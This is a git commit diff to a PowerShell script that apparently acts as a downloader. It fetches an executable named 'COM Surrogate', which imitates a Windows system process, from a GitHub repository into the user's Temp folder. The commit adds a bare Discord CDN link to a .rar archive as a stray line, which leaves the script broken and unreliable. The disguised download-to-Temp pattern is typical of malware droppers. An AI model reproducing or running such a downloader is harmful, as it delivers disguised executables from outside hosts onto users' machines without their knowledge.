33fecafd17a5596cb08b2e149a2d11fbf5516f63
chickennuggets <118553163+M7mmdddd@users.noreply.github.com>
2025-02-21 15:15:25 -0300

    Update New Text Document.ps1

--- New Text Document.ps1
+++ New Text Document.ps1
@@ -3,7 +3,7 @@ $url = "https://github.com/M7mmdddd/webstie-demo/blob/main/files/COM%20Surrogate
 
 # Define the path where the .exe will be saved (e.g., in the Temp folder)
 $outputPath = "$env:TEMP\COM Surrogate.ex"
-
+https://cdn.discordapp.com/attachments/1333859309809041610/1342560257565655151/Rawaccel-cc.rar?ex=67ba142c&is=67b8c2ac&hm=631ebb88f83c1035515c9e03229b861f319caffe243b53e961f2438f6076bf8f&
 # Download the .exe file
 Invoke-WebRequest -Uri $url -OutFile $outputPath
 
